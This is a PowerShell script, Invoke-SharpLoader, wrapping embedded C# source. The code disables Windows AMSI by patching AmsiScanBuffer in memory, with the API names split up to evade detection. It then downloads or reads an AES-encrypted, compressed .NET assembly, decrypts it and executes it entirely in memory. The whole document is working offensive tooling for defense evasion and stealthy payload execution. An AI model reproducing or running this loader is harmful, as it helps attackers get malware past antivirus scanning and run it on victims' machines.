function Invoke-SharpLoader
{
Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $location,
        [Parameter(Mandatory=$true)]
	    [string]
        $password,
        [string]
        $argument,
        [string]
        $argument2,
        [string]
        $argument3,
        [Switch]
        $noArgs
	)

$sharploader = @"
using System;
using System.Net;
using System.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace SharpLoader
{
    public class gofor4msi
    {
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void now()
        {
            if (is64Bit())
                gofor(x64);
            else
                gofor(x86);
        }

        private static void gofor(byte[] patch)
        {
            try
            {
                var a = "am";
                var si = "si";
                var dll = ".dll";
                var lib = Win32.LoadLibrary(a+si+dll);
                var Am = "Am";
                var siScan = "siScan";
                var Buffer = "Buffer";
                var addr = Win32.GetProcAddress(lib, Am+siScan+Buffer);

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
    }
    public class Program
    {
        public static void PrintBanner()
        {
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"    ______                 __                __            ");
            Console.WriteLine(@"   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____     ");
            Console.WriteLine(@"  _\ \/ _ \/ _ `/ __/ _ \/ /__/ _ \/ _ `/ _  / -_) __/     ");
            Console.WriteLine(@" /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/        ");
            Console.WriteLine(@"                  /_/                                      ");
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"             Loads an AES Encrypted CSharp File            ");
            Console.WriteLine(@"                        from disk or URL                   ");
            Console.WriteLine();
        }
        public static string Get_Stage2(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                IWebProxy webProxy = myWebRequest.Proxy;
                if (webProxy != null)
                {
                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    myWebRequest.Proxy = webProxy;
                }
                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                Stream data = response.GetResponseStream();
                string html = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    html = sr.ReadToEnd();
                }
                return html;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
                Console.ResetColor();
                return null;
            }
        }
        public static string Get_Stage2disk(string filepath)
        {
            string folderPathToBinary = filepath;
            string base64 = System.IO.File.ReadAllText(folderPathToBinary);
            return base64;
        }
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }
        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }
        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }
        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            gofor4msi.now();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
        public static void Main(params string[] args)
        {
            PrintBanner();
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string location = args[0];
            string ishttp = "http";
            string Stage2;
            if (location.StartsWith(ishttp))
            {
                Console.Write("[*] One moment while getting our file from URL.... ");
                Stage2 = Get_Stage2(location);
            }
            else
            {
                Console.WriteLine("NO URL, loading from disk.");
                Console.Write("[*] One moment while getting our file from disk.... ");
                Stage2 = Get_Stage2disk(location);
            }
            Console.WriteLine("-> Done");
            Console.WriteLine();
            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();
            byte[] decoded = Base64_Decode(Stage2);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
            int _saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            object[] cmd = args.Skip(2).ToArray();
            loadAssembly(originalBytes, cmd);
        }
    }
}
"@

Add-Type -TypeDefinition $sharploader

if ($noArgs)
{
    [SharpLoader.Program]::Main("$location","$password")
}
elseif ($argument3)
{
    [SharpLoader.Program]::Main("$location","$password","$argument","$argument2", "$argument3")
}
elseif ($argument2)
{
    [SharpLoader.Program]::Main("$location","$password","$argument","$argument2")
}
elseif ($argument)
{
    [SharpLoader.Program]::Main("$location","$password","$argument")
}

}
